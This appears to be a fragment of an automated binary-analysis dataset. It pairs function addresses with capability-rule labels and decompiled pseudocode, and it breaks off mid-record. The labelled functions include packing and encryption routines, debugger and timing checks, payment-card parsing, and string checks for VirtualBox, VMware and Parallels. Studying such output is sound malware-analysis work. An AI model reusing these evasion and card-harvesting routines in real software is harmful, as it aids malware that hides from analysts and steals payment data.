        "decompiled_code": "\nuint __cdecl fcn.004498b0(uint32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int64_t iVar2;\n    int16_t *in_EAX;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    uint32_t arg_8h_00;\n    \n    if ((in_EAX & 0xffff0000) == 0) {\n        *arg_8h = in_EAX & 0xffff;\n        return 1;\n    }\n    if (*in_EAX == 0x23) {\n        uVar3 = fcn.0044e9d1(in_EAX + 1, 0, 10);\n        if (uVar3 >> 0x10 != 0) {\n            return 0;\n        }\n        *arg_8h = uVar3 & 0xffff;\n        return 1;\n    }\n    piVar4 = in_EAX;\n    do {\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    uVar3 = (piVar4 - (in_EAX + 1) >> 1) + 1;\n    iVar2 = uVar3 * 2;\n    arg_8h_00 = fcn.0044d234(-(iVar2 >> 0x20 != 0) | iVar2);\n    *arg_8h = arg_8h_00;\n    fcn.0044e9fd(arg_8h_00, uVar3, in_EAX);\n    fcn.005803d9();\n    return 1;\n}\n",
        "token_count": 362
    },
    "004222aa": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004222aa(uint32_t arg_8h)\n\n{\n    fcn.004a803e(*((arg_8h >> 5) * 4 + 0x439de0) + 0xc + (arg_8h & 0x1f) * 0x40);\n    return;\n}\n",
        "token_count": 75
    },
    "00423467": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00423467(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_ESI) {\n        if (*(unaff_EBP + -0x20) != unaff_ESI) {\n            puVar1 = *((*unaff_EDI >> 5) * 4 + 0x439de0) + 4 + (*unaff_EDI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.004222aa(*unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "0045806c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045806c(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *((arg_8h >> 5) * 4 + 0x464000) + 0xc + (arg_8h & 0x1f) * 0x40;\n    fcn.00635399(iVar1, iVar1);\n    return;\n}\n",
        "token_count": 92
    },
    "004163ba": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004163ba(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    \n    iVar3 = 0;\n    for (iVar1 = *(arg_8h + 8); -1 < iVar1; iVar1 = iVar1 * 2) {\n        iVar3 = iVar3 + 1;\n    }\n    iVar1 = iVar3 * 0x204 + 0x144 + *(arg_8h + 0x10);\n    iVar2 = 0x3f;\n    do {\n        *(iVar1 + 8) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    func_0x006d06f2(iVar3 * 0x8000 + *(arg_8h + 0xc), 0x8000, 0x1000, 4);\n    return;\n}\n",
        "token_count": 242
    },
    "00454cf7": {
        "rules": [
            "encrypt data using HC-128/b24f3f77371449e18042164d6f6569c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00454cf7(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 * 2) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = func_0x007138df(iVar2, uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 763
    },
    "0067f05c": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0067f05c(int32_t param_1, char *param_2, char *param_3)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = NULL;\n    if (param_3 != NULL) {\n        do {\n            param_2 = pcVar3 + param_1;\n            pcVar1 = param_2 + (5 - param_1);\n            if (((((((pcVar1 + 4 < param_3) && (*param_2 == 'V')) && (pcVar3[param_1 + 1] == 'i')) &&\n                  (((pcVar3[param_1 + 2] == 'r' && (pcVar3[param_1 + 3] == 't')) &&\n                   ((pcVar3[param_1 + 4] == 'u' && ((pcVar3[param_1 + 5] == 'a' && (pcVar3[param_1 + 6] == 'l'))))))))\n                 && ((pcVar3[param_1 + 7] == 'B' && ((pcVar3[param_1 + 8] == 'o' && (pcVar3[param_1 + 9] == 'x')))))) ||\n                (((pcVar1 < param_3 &&\n                  ((((*param_2 == 'V' && (pcVar3[param_1 + 1] == 'M')) && (pcVar3[param_1 + 2] == 'w')) &&\n                   ((pcVar3[param_1 + 3] == 'a' && (pcVar3[param_1 + 4] == 'r')))))) && (pcVar3[param_1 + 5] == 'e'))))\n               || (((((pcVar1 + 3 < param_3 && (*param_2 == 'P')) &&\n                     ((pcVar3[param_1 + 1] == 'a' &&\n                      (((pcVar3[param_1 + 2] == 'r' && (pcVar3[param_1 + 3] == 'a')) && (pcVar3[param_1 + 4] == 'l')))))\n                     ) && ((pcVar3[param_1 + 5] == 'l' && (pcVar3[param_1 + 6] == 'e')))) &&\n                   ((pcVar3[param_1 + 7] == 'l' && (pcVar3[param_1 + 8] == 's')))))) {\n                return pcVar3 & 0xffffff00 | 1;\n            }\n            pcVar3 = pcVar3 + 1;\n        } while (pcVar3 < param_3);\n    }\n    iVar2 = 0;\n    if (param_2 != NULL) {\n        for (; (param_2 >> iVar2 & 1) == 0; iVar2 = iVar2 + 1) {\n        }\n    }\n    return pcVar3 & 0xffffff00;\n}\n",
        "token_count": 646
    },
    "00442310": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00442310(void)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_EDX;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uchar *unaff_EBP;\n    int32_t unaff_ESI;\n    uint *puVar4;\n    uint unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint var_80h;\n    uint uStack4;\n    \n    uStack4 = 0xd1107596;\n    fcn.00634fd4();\n    if (unaff_EBP <= &stack0x0000005c) {\n        uVar2 = unaff_EBP + -0x80 & 0xfffffffc;\n        puVar3 = uVar2 - 0x40;\n        *(uVar2 - 0x44) = unaff_EDI;\n        *(uVar2 - 0x48) =\n             unaff_ESI +\n             ((extraout_EDX >> 0x18 | (extraout_EDX & 0xff0000) >> 8 | (extraout_EDX & 0xff00) << 8 |\n              extraout_EDX << 0x18) - 1);\n        *(uVar2 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar2, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar3 < 0) * 0x80 | (puVar3 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar3 & 0xff) & 1U) == 0) * 4 | uVar2 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar4 = &uStack4;\n        for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 615
    },
    "00655363": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00655363(void)\n\n{\n    uint32_t uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *unaff_ESI;\n    uint *puVar4;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0xd11386b2;\n    fcn.00634fd4();\n    if (unaff_ESI <= &stack0x0000005c) {\n        uVar1 = unaff_ESI + -0x80 & 0xfffffffc;\n        puVar2 = uVar1 - 0x40;\n        *(uVar1 - 0x44) = unaff_EDI + ~(extraout_ECX + 1U);\n        *(uVar1 - 0x48) = unaff_ESI;\n        *(uVar1 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar1, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar2 < 0) * 0x80 | (puVar2 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar2 & 0xff) & 1U) == 0) * 4 | uVar1 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar4 = &uStack4;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 553
    },
    "0043f800": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0043f800(void)\n\n{\n    uint32_t uVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uchar *unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar4;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint var_80h;\n    uint uStack4;\n    \n    uStack4 = 0xb83a3125;\n    iVar3 = fcn.0044cb74();\n    if (unaff_EBP <= &stack0x0000005c) {\n        uVar1 = unaff_EBP + -0x80 & 0xfffffffc;\n        puVar2 = uVar1 - 0x40;\n        *(uVar1 - 0x44) = unaff_EDI + iVar3;\n        *(uVar1 - 0x48) = unaff_ESI;\n        *(uVar1 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar1, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar2 < 0) * 0x80 | (puVar2 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar2 & 0xff) & 1U) == 0) * 4 | uVar1 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar4 = &uStack4;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "004e4f32": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004e4f32(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    int32_t unaff_ESI;\n    uint *puVar4;\n    uchar *unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    puVar4 = &uStack4;\n    uStack4 = 0xd11386b2;\n    fcn.00634fd4();\n    if (unaff_EDI <= &stack0x0000005c) {\n        uVar2 = unaff_EDI + -0x80 & 0xfffffffc;\n        puVar3 = uVar2 - 0x40;\n        *(uVar2 - 0x44) = unaff_EDI;\n        *(uVar2 - 0x48) = unaff_ESI + 4;\n        *(uVar2 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar2, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar3 < 0) * 0x80 | (puVar3 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar3 & 0xff) & 1U) == 0) * 4 | uVar2 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 539
    },
    "0043ff00": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0043ff00(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *unaff_ESI;\n    uint *puVar5;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0xedb7de32;\n    uVar1 = fcn.0067ea0a();\n    if (unaff_ESI <= &stack0x0000005c) {\n        uVar2 = unaff_ESI + -0x80 & 0xfffffffc;\n        puVar3 = uVar2 - 0x40;\n        *(uVar2 - 0x44) =\n             unaff_EDI +\n             ((uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) << 3 |\n             (uVar1 << 0x18) >> 0x1d);\n        *(uVar2 - 0x48) = unaff_ESI;\n        *(uVar2 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar2, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar3 < 0) * 0x80 | (puVar3 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar3 & 0xff) & 1U) == 0) * 4 | uVar2 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar5 = &uStack4;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar3 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 620
    },
    "004d10aa": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x006a59bb)\n\nvoid fcn.004d10aa(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uint unaff_ESI;\n    uint *puVar4;\n    uchar *unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0x131b1487;\n    fcn.00509970();\n    if (unaff_EDI <= &stack0x0000005c) {\n        uVar2 = unaff_EDI + -0x80 & 0xfffffffc;\n        puVar3 = uVar2 - 0x40;\n        *(uVar2 - 0x44) = unaff_EDI;\n        *(uVar2 - 0x48) = unaff_ESI;\n        *(uVar2 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar2, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar3 < 0) * 0x80 | (puVar3 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar3 & 0xff) & 1U) == 0) * 4 | uVar2 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar4 = &uStack4;\n        for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 548
    },
    "0044a4ad": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0044a4ad(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uchar *unaff_ESI;\n    uint *puVar6;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack4;\n    \n    uStack4 = 0xf89c38e9;\n    uVar1 = fcn.00510320();\n    uVar1 = (~uVar1 + 0x6e827d84) * 2 | ~uVar1 + 0x6e827d84 < 0;\n    uVar2 = -uVar1;\n    if (unaff_ESI <= &stack0x0000005c) {\n        uVar4 = unaff_ESI + -0x80 & 0xfffffffc;\n        puVar5 = uVar4 - 0x40;\n        *(uVar4 - 0x44) =\n             unaff_EDI + ((uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar1 * -0x1000000) - 1);\n        *(uVar4 - 0x48) = unaff_ESI;\n        *(uVar4 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar4, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar5 < 0) * 0x80 | (puVar5 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar5 & 0xff) & 1U) == 0) * 4 | uVar4 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        puVar6 = &uStack4;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 661
    },
    "004f950e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.004f950e(uint8_t param_1, int16_t param_2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uint32_t *unaff_EBP;\n    int32_t unaff_ESI;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t unaff_EDI;\n    uint8_t in_CF;\n    uint8_t uVar7;\n    uint8_t in_PF;\n    uint8_t in_AF;\n    uint8_t in_ZF;\n    uint8_t in_SF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_OF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint var_80h;\n    \n    uVar2 = param_1 & 0x1f;\n    uVar5 = param_2 << uVar2;\n    bVar1 = (param_1 & 0x1f) != 0;\n    uVar7 = !bVar1 & in_CF | (bVar1 && param_2 << uVar2 - 1 < 0);\n    bVar1 = (param_1 & 0x1f) != 0;\n    *(unaff_EBP + 1) = uVar5;\n    *unaff_EBP = (in_NT & 1) * 0x4000 | (uVar2 != 1 & in_OF | uVar2 == 1 & (uVar7 ^ uVar5 < 0)) * 0x800 |\n                 (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (!bVar1 & in_SF | (bVar1 && uVar5 < 0)) * 0x80 |\n                 (!bVar1 & in_ZF | (bVar1 && uVar5 == 0)) * 0x40 | (in_AF & 1) * 0x10 |\n                 (!bVar1 & in_PF | (bVar1 && (POPCOUNT(uVar5 & 0xff) & 1U) == 0)) * 4 | uVar7 | (in_ID & 1) * 0x200000 |\n                 (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    uVar6 = *(unaff_ESI + -4) ^ unaff_EBX;\n    uVar6 = ((uVar6 >> 3 | uVar6 << 0x1d) + 0x841f86c8 ^ 0x612c53) + 1;\n    UNRECOVERED_JUMPTABLE =\n         unaff_EDI + ((uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 * 0x1000000) - 1);\n    if (unaff_EBP <= &stack0x00000060) {\n        uVar6 = unaff_EBP + -0x20 & 0xfffffffc;\n        puVar3 = uVar6 - 0x40;\n        *(uVar6 - 0x44) = UNRECOVERED_JUMPTABLE;\n        *(uVar6 - 0x48) = unaff_ESI + -4;\n        *(uVar6 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar6, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar3 < 0) * 0x80 | (puVar3 == NULL) * 0x40 | (in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar3 & 0xff) & 1U) == 0) * 4 | uVar6 < 0x40 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n             | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar3 = **0x10;\n            *0x10 = *0x10 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        UNRECOVERED_JUMPTABLE = *(uVar6 - 0x44);\n    }\n    // WARNING: Could not recover jumptable at 0x004c9160. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 1201
    },
    "0043fb90": {
        "rules": [
            "check for software breakpoints/4e3f376d71b04339ae2f170b8ad32c49"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0043fb90(void)\n\n{\n    uint16_t *puVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar10;\n    uint16_t extraout_DX;\n    uint32_t uVar11;\n    uchar *puVar12;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uchar *puVar13;\n    uint32_t *unaff_EDI;\n    uint16_t in_ES;\n    ushort in_CS;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ushort uStack12;\n    uint32_t uStack8;\n    uint uStack4;\n    \n    uStack4 = 0x71c3d244;\n    uStack8 = 0x4c0ab1;\n    fcn.0053c532();\n    puVar1 = extraout_ECX + 0x4a1d3bde;\n    *puVar1 = *puVar1 + in_CF * ((extraout_DX & 3) - (*puVar1 & 3));\n    uStack8 = 0x4c0ac2;\n    uVar8 = func_0x5a469381();\n    uVar6 = *0x1cc84677;\n    bVar4 = 9 < (uVar8 & 0xf);\n    uStack8 = uStack8 & 0xffff0000 | in_ES;\n    puVar13 = &stack0xfffffff4;\n    uStack12 = in_CS;\n    pcVar9 = uVar8 & 0xffffff00 | *0x1cc84677;\n    *pcVar9 = *pcVar9 + *0x1cc84677;\n    uVar11 = unaff_EBX & &stack0xfffffff4;\n    uVar5 = extraout_ECX_00 & 0x1f;\n    uVar7 = uVar6 << uVar5;\n    bVar3 = (extraout_ECX_00 & 0x1f) != 0 && uVar6 << uVar5 - 1 < '\\0';\n    bVar2 = (extraout_ECX_00 & 0x1f) != 0;\n    *(unaff_EDI + 1) = uVar8 & 0xff00 | uVar7;\n    *unaff_EDI = (in_NT & 1) * 0x4000 | (uVar5 == 1 && bVar3 != uVar7 < '\\0') * 0x800 | (in_IF & 1) * 0x200 |\n                 (in_TF & 1) * 0x100 | (!bVar2 && uVar11 < 0 || bVar2 && uVar7 < '\\0') * 0x80 |\n                 (!bVar2 && uVar11 == 0 || bVar2 && uVar7 == 0) * 0x40 | (bVar4 | in_AF & 1) * 0x10 |\n                 (!bVar2 && (POPCOUNT(uVar11 & 0xff) & 1U) == 0 || bVar2 && (POPCOUNT(uVar7) & 1U) == 0) * 4 | bVar3 |\n                 (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    if (unaff_EDI <= &stack0x00000054) {\n        uVar11 = unaff_EDI + -0x20 & 0xfffffffc;\n        puVar12 = uVar11 - 0x40;\n        *(uVar11 - 0x44) = unaff_EDI;\n        *(uVar11 - 0x48) = unaff_ESI + 4;\n        *(uVar11 - 0x4c) =\n             (in_NT & 1) * 0x4000 | SBORROW4(uVar11, 0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (puVar12 < 0) * 0x80 | (puVar12 == NULL) * 0x40 | (bVar4 | in_AF & 1) * 0x10 |\n             ((POPCOUNT(puVar12 & 0xff) & 1U) == 0) * 4 | uVar11 < 0x40 | (in_ID & 1) * 0x200000 |\n             (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar12 = *puVar13;\n            puVar13 = puVar13 + 1;\n            puVar12 = puVar12 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1269
    },
    "00402b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
